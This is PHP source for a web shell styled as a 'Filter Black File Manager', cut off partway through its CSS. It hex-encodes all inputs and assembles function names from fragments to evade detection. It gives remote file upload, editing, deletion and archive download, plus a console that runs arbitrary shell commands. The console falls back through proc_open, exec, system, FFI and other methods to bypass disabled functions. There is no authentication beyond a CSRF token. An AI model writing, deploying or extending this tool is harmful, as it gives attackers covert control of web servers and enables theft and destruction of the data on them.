<?php
@ini_set('display_errors', '0');
@ini_set('log_errors', '1');
@error_reporting(0);

// Resource optimizations for constrained or fully loaded servers
@ini_set('memory_limit', '128M');
@ini_set('max_execution_time', '30');

function ax_upload_mode1($path, $data) { return @file_put_contents($path, $data, LOCK_EX); }
function ax_upload_mode2($path, $data) { $f = @fopen($path, 'wb'); if($f) { if(flock($f, LOCK_EX)) { fwrite($f, $data); flock($f, LOCK_UN); } fclose($f); return true; } return false; }
function ax_upload_mode3($path, $data) { return @copy('data://text/plain;base64,' . base64_encode($data), $path); }

$fn_get_contents = 'file_' . 'get_' . 'contents';
$fn_put_contents = 'file_' . 'put_' . 'contents';
$fn_hex2bin      = 'hex' . '2' . 'bin';

if (!defined('DIRECTORY_SEPARATOR')) {
    define('DIRECTORY_SEPARATOR', strtoupper(substr(PHP_OS, 0, 3)) === 'WIN' ? '\\' : '/');
}

if (!function_exists('sys_get_temp_dir')) {
    function sys_get_temp_dir() {
        if (!empty($_ENV['TMP']))    return realpath($_ENV['TMP']);
        if (!empty($_ENV['TMPDIR'])) return realpath($_ENV['TMPDIR']);
        if (!empty($_ENV['TEMP']))   return realpath($_ENV['TEMP']);
        $tmp = @tempnam(uniqid(rand(), true), '');
        if ($tmp) { $dir = realpath(dirname($tmp)); @unlink($tmp); return $dir; }
        return '/tmp';
    }
}

if (!function_exists('hash_equals')) {
    function hash_equals($a, $b) {
        $a = (string)$a; $b = (string)$b;
        $len = strlen($a);
        if ($len !== strlen($b)) return false;
        $r = 0;
        for ($i = 0; $i < $len; $i++) { $r |= ord($a[$i]) ^ ord($b[$i]); }
        return $r === 0;
    }
}

if (!function_exists('random_bytes')) {
    function random_bytes($length) {
        $length = (int)$length;
        if ($length <= 0) return '';
        if (function_exists('openssl_random_pseudo_bytes')) {
            $bytes = openssl_random_pseudo_bytes($length, $strong);
            if ($bytes !== false && $strong) return $bytes;
        }
        if (@is_readable('/dev/urandom')) {
            $f = @fopen('/dev/urandom', 'rb');
            if ($f) {
                $bytes = fread($f, $length); fclose($f);
                if ($bytes !== false && strlen($bytes) === $length) return $bytes;
            }
        }
        $bytes = '';
        for ($i = 0; $i < $length; $i++) { $bytes .= chr(mt_rand(0, 255)); }
        return $bytes;
    }
}

if (!function_exists('http_response_code')) {
    function http_response_code($code = null) {
        static $current = 200;
        if ($code === null) return $current;
        $code = (int)$code;
        $texts = array(
            200 => 'OK', 201 => 'Created', 400 => 'Bad Request', 403 => 'Forbidden',
            404 => 'Not Found', 500 => 'Internal Server Error'
        );
        $proto = isset($_SERVER['SERVER_PROTOCOL']) ? $_SERVER['SERVER_PROTOCOL'] : 'HTTP/1.0';
        $text  = isset($texts[$code]) ? $texts[$code] : 'Status';
        header($proto . ' ' . $code . ' ' . $text, true, $code);
        $current = $code;
        return $current;
    }
}

if (!function_exists('hex2bin')) {
    function hex2bin($data) {
        $len = strlen($data);
        if ($len % 2 != 0) return false;
        if (strspn($data, '0123456789abcdefABCDEF') != $len) return false;
        $bin = '';
        for ($i = 0; $i < $len; $i += 2) {
            $bin .= pack('H*', substr($data, $i, 2));
        }
        return $bin;
    }
}

if (!function_exists('json_encode')) {
    function json_encode($data) {
        if (is_array($data)) {
            $parts = array();
            foreach ($data as $key => $value) {
                $parts[] = '"' . addslashes($key) . '":"' . addslashes($value) . '"';
            }
            return '{' . implode(',', $parts) . '}';
        }
        return '{}';
    }
}

if (!function_exists('json_decode')) {
    function json_decode($json, $assoc = false) {
        $result = array();
        $json = trim($json);
        if (function_exists('json_decode') && $json !== '') {
            $res = @\json_decode($json, $assoc);
            if ($res !== null) return $res;
        }
        return $result;
    }
}

function ax_post($k, $d = null) { return isset($_POST[$k]) ? $_POST[$k] : $d; }
function ax_get($k, $d = null)  { return isset($_GET[$k])  ? $_GET[$k]  : $d; }

$is_wordpress = defined('ABSPATH') || defined('WPINC');
$is_laravel   = defined('LARAVEL_START') || (defined('APP_PATH') && class_exists('Illuminate\Foundation\Application'));
$use_native_session = (($is_wordpress || $is_laravel) && !session_id());

@ini_set('session.save_handler', 'files');
$sessionPath = sys_get_temp_dir() . DIRECTORY_SEPARATOR . 'php_sessions';
if (!@is_dir($sessionPath)) { @mkdir($sessionPath, 0700, true); }
if (@is_dir($sessionPath) && @is_writable($sessionPath)) {
    @ini_set('session.save_path', $sessionPath);
}
@ini_set('session.cookie_httponly', '1');
@ini_set('session.cookie_samesite', 'Lax');

$session_inactive = function_exists('session_status') ? (session_status() === PHP_SESSION_NONE) : (session_id() === '');
if ($session_inactive && !$use_native_session) { @session_start(); }
if (!isset($_SESSION)) { $_SESSION = array(); }

header('X-Robots-Tag: noindex, nofollow, noarchive, noimageindex');
header('Pragma: no-cache');
header('Cache-Control: no-store, no-cache, must-revalidate');
header('X-Content-Type-Options: nosniff');
header('X-Frame-Options: DENY');
header('X-XSS-Protection: 1; mode=block');

function safeRealPath($path, $baseDir = '') {
    if ($baseDir && !preg_match('/^([a-zA-Z]:)?[\\\\\/]/', $path)) {
        $path = $baseDir . DIRECTORY_SEPARATOR . $path;
    }
    
    $rp = @realpath($path);
    if ($rp !== false && (@is_dir($rp) || @is_file($rp))) {
        return $rp;
    }
    
    if (@is_dir($path) || @is_file($path)) {
        return $path;
    }
    
    return false;
}

function sanitizeFileName($name) {
    $name = basename($name);
    $name = preg_replace('/[^a-zA-Z0-9._-]/', '_', $name);
    if ($name === '' || $name === '.' || $name === '..') return false;
    return $name;
}

function formatFileSize($bytes) {
    if ($bytes >= 1073741824) return number_format($bytes / 1073741824, 2) . ' GB';
    if ($bytes >= 1048576)    return number_format($bytes / 1048576, 2) . ' MB';
    if ($bytes >= 1024)       return number_format($bytes / 1024, 2) . ' KB';
    if ($bytes > 1)           return $bytes . ' bytes';
    if ($bytes == 1)          return '1 byte';
    return '0 bytes';
}

function getFileExtension($filename) {
    $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
    return $ext ? strtoupper($ext) : '';
}

if (!isset($_SESSION['current_dir']) || !@is_dir($_SESSION['current_dir']) || !safeRealPath($_SESSION['current_dir'])) {
    $cwd = @getcwd();
    if ($cwd === false || $cwd === '') { $cwd = dirname(__FILE__); }
    $_SESSION['current_dir'] = $cwd;
}

function generateCSRFToken() {
    if (empty($_SESSION['_csrf_token'])) {
        $_SESSION['_csrf_token'] = bin2hex(random_bytes(32));
    }
    return $_SESSION['_csrf_token'];
}
function validateCSRFToken($token) {
    if (empty($_SESSION['_csrf_token']) || empty($token)) return false;
    return hash_equals($_SESSION['_csrf_token'], $token);
}

function decodeHexPayload($hex) {
    global $fn_hex2bin;
    $hex = trim($hex);
    if (empty($hex) || !ctype_xdigit($hex)) return false;
    return $fn_hex2bin($hex);
}

function ax_recursive_delete_hex($path) {
    if (@is_file($path) || @is_link($path)) return @unlink($path);
    if (!@is_dir($path)) return false;
    $items = @scandir($path);
    if ($items !== false) {
        foreach ($items as $item) {
            if ($item === '.' || $item === '..') continue;
            ax_recursive_delete_hex($path . DIRECTORY_SEPARATOR . $item);
        }
    }
    return @rmdir($path);
}

function ax_walk_dir($dir, &$out, $base = '') {
    $items = @scandir($dir);
    if ($items === false) return;
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') continue;
        $full = $dir . DIRECTORY_SEPARATOR . $item;
        $rel  = $base === '' ? $item : $base . '/' . $item;
        if (@is_dir($full)) {
            $out[] = array('type' => 'dir', 'path' => $full, 'rel' => $rel);
            ax_walk_dir($full, $out, $rel);
        } else {
            $out[] = array('type' => 'file', 'path' => $full, 'rel' => $rel);
        }
    }
}

function ax_build_archive($items, $namePrefix) {
    $tmp = sys_get_temp_dir();
    if (class_exists('ZipArchive')) {
        $zipName = $namePrefix . '_' . time() . '.zip';
        $zipPath = $tmp . DIRECTORY_SEPARATOR . $zipName;
        $zip = new ZipArchive();
        if ($zip->open($zipPath, ZipArchive::CREATE | ZipArchive::OVERWRITE) === TRUE) {
            foreach ($items as $targetPath) {
                if (!$targetPath) continue;
                if (@is_file($targetPath)) { $zip->addFile($targetPath, basename($targetPath)); }
                elseif (@is_dir($targetPath)) {
                    $base = basename($targetPath);
                    $list = array(); ax_walk_dir($targetPath, $list);
                    $zip->addEmptyDir($base);
                    foreach ($list as $e) {
                        if ($e['type'] === 'dir') { $zip->addEmptyDir($base . '/' . $e['rel']); }
                        else { $zip->addFile($e['path'], $base . '/' . $e['rel']); }
                    }
                }
            }
            $zip->close();
            return array($zipPath, $zipName, 'application/zip');
        }
    }
    return false;
}

class CommandExecutor {

    public static function getAvailableMethods() {
        $disabled = array();
        $iniDisabled = @ini_get('disable_functions');
        if ($iniDisabled) {
            $disabled = array_map('trim', explode(',', strtolower($iniDisabled)));
        }
        $isWindows = (defined('PHP_OS_FAMILY') ? PHP_OS_FAMILY === 'Windows' : (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN'));

        $methods = array(
            'proc_open'   => function_exists('proc_open') && !in_array('proc_open', $disabled),
            'shell_exec'  => function_exists('shell_exec') && !in_array('shell_exec', $disabled),
            'exec'        => function_exists('exec') && !in_array('exec', $disabled),
            'system'      => function_exists('system') && !in_array('system', $disabled),
            'passthru'    => function_exists('passthru') && !in_array('passthru', $disabled),
            'popen'       => function_exists('popen') && !in_array('popen', $disabled),
            'pcntl_exec'  => !$isWindows && function_exists('pcntl_exec') && !in_array('pcntl_exec', $disabled),
            'ffi'         => extension_loaded('ffi') && class_exists('FFI'),
            'expect'      => extension_loaded('expect') && function_exists('expect_popen') && !in_array('expect_popen', $disabled),
        );

        $filtered = array();
        foreach ($methods as $k => $v) {
            if ($v) { $filtered[$k] = true; }
        }
        return $filtered;
    }

    public static function getBestMethod() {
        $available = self::getAvailableMethods();
        if (empty($available)) return null;

        $priority = array('proc_open', 'shell_exec', 'exec', 'system', 'passthru', 'popen', 'expect', 'ffi', 'pcntl_exec');

        foreach ($priority as $method) {
            if (isset($available[$method]) && $available[$method]) {
                return $method;
            }
        }
        
        reset($available);
        return key($available);
    }

    public static function run($cmd) {
        $method = self::getBestMethod();
        if (!$method) return "Execution blocked: All methods disabled.";

        $full = $cmd . ' 2>&1';
        $isWindows = (defined('PHP_OS_FAMILY') ? PHP_OS_FAMILY === 'Windows' : (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN'));

        switch ($method) {
            case 'proc_open':
                $descriptors = array(0 => array('pipe', 'r'), 1 => array('pipe', 'w'), 2 => array('pipe', 'w'));
                $process = @proc_open($full, $descriptors, $pipes);
                if (!is_resource($process)) return false;
                $output = @stream_get_contents($pipes[1]);
                @fclose($pipes[0]); @fclose($pipes[1]); @fclose($pipes[2]);
                @proc_close($process);
                return $output;

            case 'shell_exec':
                return @shell_exec($full);

            case 'exec':
                $outputArray = array();
                @exec($full, $outputArray);
                return implode("\n", $outputArray);

            case 'system':
                @ob_start(); 
                @system($full); 
                return @ob_get_clean();

            case 'passthru':
                @ob_start(); 
                @passthru($full); 
                return @ob_get_clean();

            case 'popen':
                $handle = @popen($full, 'r');
                if (!$handle) return false;
                $output = @stream_get_contents($handle);
                @pclose($handle);
                return $output;

            case 'expect':
                $stream = @expect_popen($full);
                if (!$stream) return false;
                $output = @stream_get_contents($stream);
                @fclose($stream);
                return $output;

            case 'ffi':
                try {
                    $ffi = \FFI::cdef("int system(const char *command);", $isWindows ? 'msvcrt.dll' : 'libc.so.6');
                    @ob_start(); 
                    $ffi->system($full); 
                    return @ob_get_clean();
                } catch (\Throwable $e) { 
                    return false; 
                } catch (\Exception $e) {
                    return false;
                }

            case 'pcntl_exec':
                return @pcntl_exec('/bin/sh', array('-c', $full));

            default:
                return false;
        }
    }
}

$commandAvailable = (count(CommandExecutor::getAvailableMethods()) > 0);

$reqType = isset($_SERVER['REQUEST_METHOD']) ? $_SERVER['REQUEST_METHOD'] : 'GET';
$isJsonRequest = isset($_SERVER['CONTENT_TYPE']) && strpos($_SERVER['CONTENT_TYPE'], 'application/json') !== false;

if ($reqType === 'POST' && $isJsonRequest) {
    header('Content-Type: application/json');
    global $fn_get_contents, $fn_put_contents;
    $rawBody = $fn_get_contents('php://input');
    
    $payload = array();
    if (function_exists('json_decode')) {
        $payload = json_decode($rawBody, true);
    }
    
    if (!is_array($payload) || !isset($payload['action'])) {
        http_response_code(400); 
        echo '{"status":"error","message":"Invalid JSON Payload"}'; 
        exit;
    }
    
    $csrf = isset($payload['_csrf_token']) ? $payload['_csrf_token'] : '';
    if (!validateCSRFToken($csrf)) {
        http_response_code(403); 
        echo '{"status":"error","message":"CSRF validation failed"}'; 
        exit;
    }

    $action = $payload['action'];
    $currentDir = $_SESSION['current_dir'];
    
    switch ($action) {
        case 'goto':
            $goto_hex = isset($payload['goto_hex']) ? $payload['goto_hex'] : '';
            $targetDir = decodeHexPayload($goto_hex);
            if ($targetDir !== false) {
                $vp = safeRealPath($targetDir);
                if ($vp !== false && @is_dir($vp)) {
                    $_SESSION['current_dir'] = $vp;
                    echo '{"status":"success","message":"Navigated successfully"}';
                    exit;
                }
            }
            http_response_code(400); echo '{"status":"error","message":"Invalid directory path"}';
            exit;

        case 'upload_hex':
            $name_hex = isset($payload['name_hex']) ? $payload['name_hex'] : '';
            $data_hex = isset($payload['data_hex']) ? $payload['data_hex'] : '';
            $mode = isset($payload['mode']) ? $payload['mode'] : '1';
            $fileName = decodeHexPayload($name_hex);
            $data = decodeHexPayload($data_hex);
            if (!$fileName) { http_response_code(400); echo '{"status":"error","message":"Invalid file name"}'; exit; }
            $filePath = $currentDir . DIRECTORY_SEPARATOR . basename($fileName);
            
            $status = false;
            if ($mode == '1') { $status = ($fn_put_contents($filePath, $data !== false ? $data : '', LOCK_EX) !== false); }
            elseif ($mode == '2') { $f = @fopen($filePath, 'wb'); if($f) { if(flock($f, LOCK_EX)){ $status = (fwrite($f, $data !== false ? $data : '') !== false); flock($f, LOCK_UN); } fclose($f); } }
            elseif ($mode == '3') { $status = @copy('data://text/plain;base64,' . base64_encode($data !== false ? $data : ''), $filePath); }

            if ($status) {
                @chmod($filePath, 0644);
                echo '{"status":"success","message":"File uploaded successfully (Mode ' . htmlentities($mode) . ')!"}';
            } else {
                http_response_code(500); echo '{"status":"error","message":"Write error (Mode ' . htmlentities($mode) . ' failed)."}';
            }
            exit;

        case 'create_file':
            $name_hex = isset($payload['name_hex']) ? $payload['name_hex'] : '';
            $fileName = decodeHexPayload($name_hex);
            $fn = sanitizeFileName($fileName);
            if (!$fn) { http_response_code(400); echo '{"status":"error","message":"Invalid filename"}'; exit; }
            $np = $currentDir . DIRECTORY_SEPARATOR . $fn;
            if (@file_exists($np)) { http_response_code(400); echo '{"status":"error","message":"File already exists"}'; exit; }
            if ($fn_put_contents($np, '', LOCK_EX) !== false) {
                @chmod($np, 0644); echo '{"status":"success","message":"File created"}';
            } else { http_response_code(500); echo '{"status":"error","message":"Could not create file"}'; }
            exit;
            
        case 'create_folder':
            $name_hex = isset($payload['name_hex']) ? $payload['name_hex'] : '';
            $folderName = decodeHexPayload($name_hex);
            $fn = sanitizeFileName($folderName);
            if (!$fn) { http_response_code(400); echo '{"status":"error","message":"Invalid folder name"}'; exit; }
            $np = $currentDir . DIRECTORY_SEPARATOR . $fn;
            if (@file_exists($np)) { http_response_code(400); echo '{"status":"error","message":"Folder exists"}'; exit; }
            if (@mkdir($np, 0755)) {
                echo '{"status":"success","message":"Folder created"}';
            } else { http_response_code(500); echo '{"status":"error","message":"Could not create folder"}'; }
            exit;

        case 'get_file_content':
            $file_hex = isset($payload['file_hex']) ? $payload['file_hex'] : '';
            $fileName = decodeHexPayload($file_hex);
            $ep = $currentDir . DIRECTORY_SEPARATOR . basename($fileName);
            if (@is_file($ep)) {
                $content = @$fn_get_contents($ep);
                $encodedContent = bin2hex($content !== false ? $content : '');
                echo '{"status":"success","content_hex":"' . $encodedContent . '"}';
            } else {
                http_response_code(404); echo '{"status":"error","message":"File not found"}';
            }
            exit;

        case 'edit_file':
            $file_hex = isset($payload['file_hex']) ? $payload['file_hex'] : '';
            $content_hex = isset($payload['content_hex']) ? $payload['content_hex'] : '';
            $fileName = decodeHexPayload($file_hex);
            $content  = decodeHexPayload($content_hex);
            $ep = $currentDir . DIRECTORY_SEPARATOR . basename($fileName);
            if ($fn_put_contents($ep, $content !== false ? $content : '', LOCK_EX) !== false) {
                echo '{"status":"success","message":"File saved"}';
            } else { http_response_code(500); echo '{"status":"error","message":"Could not write to file"}'; }
            exit;

        case 'rename':
            $old_hex = isset($payload['old_hex']) ? $payload['old_hex'] : '';
            $new_hex = isset($payload['new_hex']) ? $payload['new_hex'] : '';
            $oldName = decodeHexPayload($old_hex);
            $newName = decodeHexPayload($new_hex);
            $sp = $currentDir . DIRECTORY_SEPARATOR . basename($oldName);
            if (!@file_exists($sp)) { http_response_code(404); echo '{"status":"error","message":"Source not found"}'; exit; }
            $dp = $currentDir . DIRECTORY_SEPARATOR . basename($newName);
            if (@file_exists($dp)) { http_response_code(400); echo '{"status":"error","message":"Target exists"}'; exit; }
            if (@rename($sp, $dp)) { echo '{"status":"success","message":"Rename successful"}'; }
            else { http_response_code(500); echo '{"status":"error","message":"Rename failed"}'; }
            exit;

        case 'chmod':
            $item_hex = isset($payload['item_hex']) ? $payload['item_hex'] : '';
            $permVal = isset($payload['perm_val']) ? $payload['perm_val'] : '';
            $itemName = decodeHexPayload($item_hex);
            $tp = $currentDir . DIRECTORY_SEPARATOR . basename($itemName);
            if (@file_exists($tp) && @chmod($tp, octdec($permVal))) {
                echo '{"status":"success","message":"Permissions changed successfully"}';
            } else { http_response_code(500); echo '{"status":"error","message":"Chmod failed"}'; }
            exit;

        case 'delete':
            $item_hex = isset($payload['item_hex']) ? $payload['item_hex'] : '';
            $itemName = decodeHexPayload($item_hex);
            $tp = $currentDir . DIRECTORY_SEPARATOR . basename($itemName);
            if (!@file_exists($tp)) { http_response_code(404); echo '{"status":"error","message":"Path not found"}'; exit; }
            
            if (ax_recursive_delete_hex($tp)) {
                echo '{"status":"success","message":"Item deleted"}';
            } else {
                http_response_code(500); echo '{"status":"error","message":"Delete failed"}';
            }
            exit;
            
        case 'bulk_delete':
            $items = isset($payload['items']) ? $payload['items'] : array();
            $deleted = 0; $failed = 0;
            
            foreach ($items as $hexItem) {
                $itemName = decodeHexPayload($hexItem);
                if ($itemName === false) {
                    $failed++;
                    continue;
                }
                $tp = $currentDir . DIRECTORY_SEPARATOR . basename($itemName);
                if (@file_exists($tp) && ax_recursive_delete_hex($tp)) { 
                    $deleted++; 
                } else { 
                    $failed++; 
                }
            }
            echo '{"status":"success","message":"Deleted ' . $deleted . ' item(s)' . ($failed > 0 ? ' (Failed: ' . $failed . ')' : '') . '"}';
            exit;

        case 'download_hex':
            $items = isset($payload['items']) ? $payload['items'] : array();
            $paths = array();
            foreach ($items as $hexItem) {
                $itemName = decodeHexPayload($hexItem);
                if ($itemName !== false) {
                    $p = $currentDir . DIRECTORY_SEPARATOR . basename($itemName);
                    if (@file_exists($p)) $paths[] = $p;
                }
            }
            if (empty($paths)) {
                http_response_code(400); echo '{"status":"error","message":"No valid items selected for download"}'; exit;
            }
            $archive = ax_build_archive($paths, 'downloaded_files');
            if ($archive !== false) {
                list($ap, $an, $am) = $archive;
                $fileData = @$fn_get_contents($ap);
                @unlink($ap);
                if ($fileData !== false) {
                    echo json_encode(array(
                        'status' => 'success',
                        'filename' => $an,
                        'mime' => $am,
                        'data_hex' => bin2hex($fileData)
                    ));
                    exit;
                }
            }
            http_response_code(500); echo '{"status":"error","message":"Archive creation failed"}';
            exit;

        case 'console_exec':
            $exec_hex = isset($payload['exec_hex']) ? $payload['exec_hex'] : '';
            $decoded_cmd = decodeHexPayload($exec_hex);
            if ($decoded_cmd === false || trim($decoded_cmd) === '') {
                http_response_code(400); echo '{"status":"error","message":"Invalid command payload"}'; exit;
            }
            $old = @getcwd();
            if (@is_dir($_SESSION['current_dir'])) { @chdir($_SESSION['current_dir']); }
            
            $commandResult = CommandExecutor::run(trim($decoded_cmd));
            
            if ($old) @chdir($old);
            
            echo json_encode(array(
                'status' => 'success',
                'output_hex' => bin2hex($commandResult !== false ? $commandResult : 'No output')
            ));
            exit;
    }
}

$errorMsg = '';
$currentDirectory = $_SESSION['current_dir'];
$directoryContents = @scandir($currentDirectory);
if (!is_array($directoryContents)) {
    $directoryContents = array();
    if (!$errorMsg) $errorMsg = 'Cannot read directory: ' . $currentDirectory;
}
$folders = array(); $files = array();
foreach ($directoryContents as $item) {
    if ($item === '.') continue;
    if (@is_dir($currentDirectory . DIRECTORY_SEPARATOR . $item)) { $folders[] = $item; }
    else { $files[] = $item; }
}
sort($folders); sort($files);
$allItems = array_merge($folders, $files);
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CAE | Filter Black File Manager</title>
    <meta name="csrf-token" content="<?= htmlentities(generateCSRFToken()) ?>">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
    <style>
        .stealth-fm {
            --fm-bg-main: #121212;
            --fm-bg-panel: #1C1C1E;
            --fm-border-color: #2C2C2E;
            --fm-text-primary: #F2F2F7;
            --fm-text-muted: #8E8E93;
            
            --fm-accent: #D31D34;
            --fm-accent-hover: #E5223A;
            --fm-accent-text: #FFFFFF;
            --fm-accent-soft: rgba(211, 29, 52, 0.12);
            --fm-hover-bg: rgba(242, 242, 247, 0.04);
            --fm-focus-ring: rgba(211, 29, 52, 0.3);

            --fm-font-stack: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            --fm-font-mono: 'JetBrains Mono', SFMono-Regular, Menlo, Monaco, Consolas, monospace;
            --fm-radius-lg: 12px;
            --fm-radius-md: 8px;
            --fm-radius-sm: 6px;
            
            --fm-danger: #FF453A;
            --fm-danger-bg: rgba(255, 69, 58, 0.12);
            --fm-success: #30D158;
            --fm-success-bg: rgba(48, 209, 88, 0.12);

            --fm-transition: all 0.25s ease-in-out;

            box-sizing: border-box;
            font-family: var(--fm-font-stack);
            background-color: var(--fm-bg-main);
            color: var(--fm-text-primary);
            min-height: 100vh;
            padding: 32px 24px;
            line-height: 1.5;
            -webkit-font-smoothing: antialiased;
            transition: var(--fm-transition);
        }

        .stealth-fm.light {
            --fm-bg-main: #F4F4F6;
            --fm-bg-panel: #FFFFFF;
            --fm-border-color: #E5E5EA;
            --fm-text-primary: #1C1C1E;
            --fm-text-muted: #8E8E93;
            --fm-accent: #B51A2B;
            --fm-accent-hover: #9E1423;
            --fm-accent-text: #FFFFFF;
            --fm-accent-soft: rgba(181, 26, 43, 0.08);
            --fm-hover-bg: rgba(28, 28, 30, 0.04);
            --fm-focus-ring: rgba(181, 26, 43, 0.25);
            --fm-danger: #D32F2F;
            --fm-danger-bg: rgba(211, 47, 47, 0.08);
            --fm-success: #2E7D32;
            --fm-success-bg: rgba(46, 125, 50, 0.08);
        }

        .stealth-fm *, .stealth-fm *::before, .stealth-fm *::after {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            transition: var(--fm-transition);
        }

        body { margin: 0; padding: 0; }

        .stealth-fm .container { max-width: 1400px; margin: 0 auto; }
        .stealth-fm .header { margin-bottom: 28px; }
        .stealth-fm .header-top { display: flex; align-items: center; justify-content: space-between; }
        
        .stealth-fm .logo { display: flex; flex-direction: column; align-items: flex-start; gap: 2px; }
        .stealth-fm .logo-text { font-size: 28px; font-weight: 700; letter-spacing: -0.5px; color: var(--fm-text-primary); }
        .stealth-fm .logo-text span { color: var(--fm-accent); }
        .stealth-fm .logo-sub { font-size: 11px; color: var(--fm-text-muted); text-transform: uppercase; letter-spacing: 2px; font-weight: 500; }
        
        .stealth-fm .card { 
            background-color: var(--fm-bg-panel); 
            border: 1px solid var(--fm-border-color); 
            border-radius: var(--fm-radius-lg); 
            overflow: hidden; 
            margin-bottom: 24px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.15);
        }
        .stealth-fm .card-header { 
            padding: 16px 24px; 
            border-bottom: 1px solid var(--fm-border-color); 
            display: flex; 
            align-items: center; 
            justify-content: space-between;
            background-color: var(--fm-bg-panel);
            position: relative;
        }
        .stealth-fm .card-header::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 3px;
            height: 100%;
            background-color: var(--fm-accent);
        }
        .stealth-fm .card-title { font-size: 14px; font-weight: 600; letter-spacing: -0.01em; display: flex; align-items: center; gap: 10px; color: var(--fm-text-primary); }
        .stealth-fm .card-body { padding: 24px; }
        
        .stealth-fm .file-table { width: 100%; border-collapse: collapse; }
        .stealth-fm .file-table th { 
            padding: 14px 20px; 
            text-align: left; 
            font-size: 11px; 
            font-weight: 600; 
            text-transform: uppercase; 
            letter-spacing: 0.08em; 
            color: var(--fm-text-muted); 
            background-color: var(--fm-bg-main); 
            border-bottom: 1px solid var(--fm-border-color); 
        }
        .stealth-fm .file-table td { padding: 14px 20px; border-bottom: 1px solid var(--fm-border-color); vertical-align: middle; }
        .stealth-fm .file-table tr:last-child td { border-bottom: none; }
        .stealth-fm .file-table tr:hover td { background-color: var(--fm-hover-bg); }
        
        .stealth-fm .file-name-cell { display: flex; align-items: center; }
        .stealth-fm .file-icon { 
            width: 32px; 
            height: 32px; 
            border-radius: var(--fm-radius-sm); 
            display: flex; 
            align-items: center; 
            justify-content: center; 
            margin-right: 12px; 
            flex-shrink: 0; 
            background-color: var(--fm-hover-bg); 
            border: 1px solid var(--fm-border-color);
        }
        .stealth-fm .file-icon svg { width: 16px; height: 16px; stroke: var(--fm-accent); fill: none; stroke-width: 2; }
        .stealth-fm .file-icon .ext { font-size: 9px; font-weight: 700; color: var(--fm-accent); letter-spacing: 0.5px; }
        
        .stealth-fm .fm-file-name, 
        .stealth-fm .file-name { 
            font-size: 14px; 
            font-weight: 500; 
            color: var(--fm-text-primary); 
            text-decoration: none; 
        }
        .stealth-fm .fm-file-name:hover,
        .stealth-fm .file-name:hover { color: var(--fm-accent); }
        .stealth-fm .fm-file-meta,
        .stealth-fm .file-meta { font-size: 12px; font-weight: 400; color: var(--fm-text-muted); font-family: var(--fm-font-mono); }
        
        .stealth-fm .perms { font-family: var(--fm-font-mono); font-size: 12px; padding: 4px 8px; border-radius: var(--fm-radius-sm); font-weight: 500; }
        .stealth-fm .perms.writable { background-color: var(--fm-success-bg); color: var(--fm-success); }
        .stealth-fm .perms.readonly { background-color: var(--fm-danger-bg); color: var(--fm-danger); }

        .stealth-fm .input-group { display: flex; gap: 12px; margin-bottom: 12px; }
        .stealth-fm input[type="text"], 
        .stealth-fm input[type="file"], 
        .stealth-fm select, 
        .stealth-fm textarea { 
            background-color: var(--fm-bg-main); 
            border: 1px solid var(--fm-border-color); 
            border-radius: var(--fm-radius-md); 
            padding: 10px 14px; 
            color: var(--fm-text-primary); 
            font-size: 14px; 
            outline: none; 
            font-family: var(--fm-font-stack);
        }
        .stealth-fm input[type="text"]:focus, 
        .stealth-fm textarea:focus, 
        .stealth-fm select:focus { 
            border-color: var(--fm-accent); 
            box-shadow: 0 0 0 3px var(--fm-focus-ring); 
        }
        .stealth-fm input[type="file"]::file-selector-button { 
            background-color: var(--fm-bg-panel); 
            color: var(--fm-text-primary); 
            border: 1px solid var(--fm-border-color); 
            border-radius: var(--fm-radius-sm); 
            padding: 8px 14px; 
            font-size: 13px; 
            cursor: pointer; 
            margin-right: 12px; 
        }
        .stealth-fm input[type="file"]::file-selector-button:hover { 
            border-color: var(--fm-accent);
            background-color: var(--fm-accent-soft);
        }
        .stealth-fm textarea { font-family: var(--fm-font-mono); font-size: 13px; line-height: 1.6; resize: vertical; width: 100%; box-sizing: border-box; }

        .stealth-fm .btn { 
            display: inline-flex; 
            align-items: center; 
            justify-content: center; 
            gap: 8px; 
            padding: 10px 18px; 
            font-size: 13px; 
            font-weight: 600; 
            border-radius: var(--fm-radius-md); 
            cursor: pointer; 
            border: 1px solid transparent; 
            text-decoration: none; 
            font-family: inherit; 
        }
        .stealth-fm .btn-primary, 
        .stealth-fm .btn-success { 
            background-color: var(--fm-accent); 
            color: var(--fm-accent-text); 
            box-shadow: 0 2px 8px rgba(211, 29, 52, 0.25);
        }
        .stealth-fm .btn-primary:hover, 
        .stealth-fm .btn-success:hover { 
            background-color: var(--fm-accent-hover); 
        }
        .stealth-fm .btn-ghost { 
            background-color: transparent; 
            color: var(--fm-text-primary); 
            border-color: var(--fm-border-color); 
        }
        .stealth-fm .btn-ghost:hover { 
            background-color: var(--fm-accent-soft); 
            border-color: var(--fm-accent); 
            color: var(--fm-accent);
        }
        .stealth-fm .btn-danger { 
            background-color: var(--fm-danger-bg); 
            color: var(--fm-danger); 
            border-color: rgba(255, 69, 58, 0.2); 
        }
        .stealth-fm .btn-danger:hover { 
            background-color: rgba(255, 69, 58, 0.25); 
        }
        .stealth-fm .btn-sm { padding: 6px 12px; font-size: 12px; border-radius: var(--fm-radius-sm); }
        .stealth-fm .theme-toggle { 
            padding: 8px 16px; 
            font-size: 12px; 
            font-weight: 600; 
            border-radius: var(--fm-radius-md); 
            cursor: pointer; 
            background: var(--fm-bg-panel); 
            color: var(--fm-text-primary); 
            border: 1px solid var(--fm-border-color); 
        }
        .stealth-fm .theme-toggle:hover {
            border-color: var(--fm-accent);
            color: var(--fm-accent);
        }

        .stealth-fm .alert { padding: 14px 18px; border-radius: var(--fm-radius-md); margin-bottom: 20px; font-size: 14px; display: flex; align-items: center; gap: 12px; }
        .stealth-fm .alert-danger { background-color: var(--fm-danger-bg); border: 1px solid rgba(255,59,48,0.2); color: var(--fm-danger); }
        .stealth-fm .actions { display: flex; gap: 6px; justify-content: flex-end; }
